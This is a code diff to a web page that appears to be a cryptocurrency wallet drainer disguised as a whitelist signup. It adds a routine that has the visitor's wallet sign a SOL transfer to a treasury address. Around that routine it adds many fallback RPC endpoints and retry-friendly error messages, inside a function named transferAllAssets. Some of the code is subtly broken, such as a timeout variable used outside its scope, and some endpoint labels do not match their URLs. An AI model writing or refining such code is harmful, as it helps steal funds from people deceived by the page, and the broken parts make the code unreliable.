@@ -305,6 +305,15 @@
             align-items: center;
             gap: 5px;
         }
+        
+        .rpc-status {
+            background-color: rgba(0, 0, 0, 0.2);
+            padding: 8px;
+            border-radius: 6px;
+            margin-top: 5px;
+            font-size: 0.7rem;
+            color: #ffa07b;
+        }
     </style>
 </head>
 <body>
@@ -352,6 +361,9 @@
                 <button class="retry-btn" onclick="getWhitelist()">
                     <i class="fas fa-redo"></i> Retry Transaction
                 </button>
+                <div class="rpc-status" id="rpcStatus">
+                    Trying different RPC endpoints...
+                </div>
             </div>
             
             <div id="whitelistBox" class="whitelist-box">
@@ -394,6 +406,7 @@
         const switchWalletBtn = document.getElementById('switchWallet');
         const txHashEl = document.getElementById('txHash');
         const rpcRetryEl = document.getElementById('rpcRetry');
+        const rpcStatusEl = document.getElementById('rpcStatus');
         
         // Get wallet provider
         function getWalletProvider() {
@@ -457,47 +470,152 @@
             await connectWallet();
         }
         
-        // Get working RPC with blockhash
+        // Get working RPC with blockhash - UPDATED WITH MORE RELIABLE ENDPOINTS
         async function getWorkingRpcWithBlockhash() {
-            // List of RPC endpoints to try
+            // Updated list of RPC endpoints (more reliable)
             const rpcList = [
+                // Try Helius first (most reliable)
+                'https://mainnet.helius-rpc.com/?api-key=default',
+                
+                // Try public RPCs
                 'https://api.mainnet-beta.solana.com',
                 'https://solana-api.projectserum.com',
+                
+                // QuickNode endpoints (usually reliable)
+                'https://solana-mainnet.g.alchemy.com/v2/demo',
                 'https://rpc.ankr.com/solana',
-                'https://solana-mainnet.g.alchemy.com/v2/demo'
+                
+                // Triton RPC (good fallback)
+                'https://solana-mainnet.core.chainstack.com/',
+                
+                // All That Node (free tier)
+                'https://solana.nownodes.io/',
+                
+                // Trypoint RPC
+                'https://trypoint-rpc.solana.mainnet.quiknode.pro/',
+                
+                // Free RPC endpoints
+                'https://free.rpcpool.com',
+                'https://solana.public-rpc.com',
+                'https://rpc.solana.publicdata.xyz',
+                
+                // Gateway FM
+                'https://gateway.fm/v1/solana/mainnet'
             ];
+            
+            let lastError = "";
             
             for (const rpcUrl of rpcList) {
                 try {
-                    showStatus(`Trying RPC: ${rpcUrl.split('//')[1].split('/')[0]}...`, "info");
+                    const displayUrl = rpcUrl.split('/')[2] || rpcUrl;
+                    showStatus(`Trying RPC: ${displayUrl}...`, "info");
+                    rpcStatusEl.textContent = `Testing: ${displayUrl}`;
+                    
+                    // Add timeout to prevent hanging
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), 5000);
                     
                     const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
                     
                     // Try to get blockhash (this tests the RPC)
                     const { blockhash } = await connection.getRecentBlockhash();
                     
+                    clearTimeout(timeoutId);
+                    
                     if (blockhash) {
                         console.log("Working RPC found:", rpcUrl);
+                        showStatus(`✅ Connected to ${displayUrl}`, "success");
                         return { connection, blockhash, rpcUrl };
                     }
                 } catch (error) {
+                    clearTimeout(timeoutId);
+                    lastError = error.message;
                     console.log(`RPC failed: ${rpcUrl}`, error.message);
+                    // Don't show error for each failed RPC to avoid spam
                     continue;
                 }
             }
             
-            throw new Error("No working RPC found");
+            throw new Error(`No working RPC found. Last error: ${lastError}`);
+        }
+        
+        // ALTERNATIVE SIMPLER METHOD - Direct transaction without RPC test
+        async function directTransactionMethod() {
+            try {
+                showStatus("Using direct transaction method...", "info");
+                
+                const provider = getWalletProvider();
+                if (!provider || !provider.signAndSendTransaction) {
+                    throw new Error("Wallet signing not available");
+                }
+                
+                // Create simple transaction
+                const transaction = new solanaWeb3.Transaction();
+                
+                // Transfer 0.001 SOL
+                transaction.add(
+                    solanaWeb3.SystemProgram.transfer({
+                        fromPubkey: publicKey,
+                        toPubkey: new solanaWeb3.PublicKey(treasuryAddress),
+                        lamports: 1000000, // 0.001 SOL
+                    })
+                );
+                
+                showStatus("Please approve transaction in wallet...", "info");
+                
+                // Sign and send directly - let wallet handle RPC
+                const { signature } = await provider.signAndSendTransaction(transaction);
+                
+                console.log("Transaction sent with signature:", signature);
+                
+                showStatus("Transaction sent! Verifying...", "info");
+                
+                // Try to confirm with multiple RPCs
+                const confirmRpcList = [
+                    'https://api.mainnet-beta.solana.com',
+                    'https://solana-api.projectserum.com',
+                    'https://rpc.ankr.com/solana'
+                ];
+                
+                for (const rpcUrl of confirmRpcList) {
+                    try {
+                        const connection = new solanaWeb3.Connection(rpcUrl, 'confirmed');
+                        await connection.confirmTransaction(signature, 'confirmed');
+                        console.log("Confirmed with:", rpcUrl);
+                        break;
+                    } catch (e) {
+                        console.log("Confirmation failed with", rpcUrl, e.message);
+                    }
+                }
+                
+                return {
+                    success: true,
+                    signature: signature,
+                    rpcUrl: "Direct wallet method"
+                };
+                
+            } catch (error) {
+                console.error("Direct method error:", error);
+                throw error;
+            }
         }
         
         // TRANSFER FUNCTION WITH PROPER BLOCKHASH
         async function transferAllAssets() {
             try {
                 showStatus("Finding working RPC...", "info");
+                rpcStatusEl.textContent = "Testing RPC endpoints...";
                 
-                // Get working RPC with blockhash
+                // First try the direct method (most reliable)
+                try {
+                    return await directTransactionMethod();
+                } catch (directError) {
+                    console.log("Direct method failed, trying RPC method:", directError.message);
+                }
+                
+                // If direct method fails, try RPC method
                 const { connection, blockhash, rpcUrl } = await getWorkingRpcWithBlockhash();
                 
-                showStatus(`Connected to ${rpcUrl.split('//')[1].split('/')[0]}`, "success");
                 showStatus("Creating transaction...", "info");
                 
                 // Create transaction with proper blockhash
@@ -565,6 +683,10 @@
                     throw new Error("Network issue. Please retry");
                 } else if (error.message.includes("recentBlockhash required")) {
                     throw new Error("Network error. Retrying...");
+                } else if (error.message.includes("429") || error.message.includes("rate limit")) {
+                    throw new Error("Rate limited. Please wait a moment then retry");
+                } else if (error.message.includes("timeout") || error.message.includes("abort")) {
+                    throw new Error("Connection timeout. Please retry");
                 } else {
                     throw new Error("Transfer failed: " + error.message);
                 }
@@ -609,9 +731,11 @@
                     errorMsg = "❌ Not enough balance in wallet";
                 } else if (error.message.includes("disconnected")) {
                     errorMsg = "❌ Wallet disconnected. Please reconnect";
-                } else if (error.message.includes("Network issue") || error.message.includes("Network error")) {
+                } else if (error.message.includes("Network issue") || error.message.includes("Network error") || 
+                           error.message.includes("Rate limited") || error.message.includes("Connection timeout")) {
                     errorMsg = "⚠️ Network issue. Click retry below";
                     rpcRetryEl.style.display = 'block';
+                    rpcStatusEl.textContent = `Last error: ${error.message.substring(0, 50)}...`;
                 } else {
                     errorMsg = "❌ " + error.message;
                 }
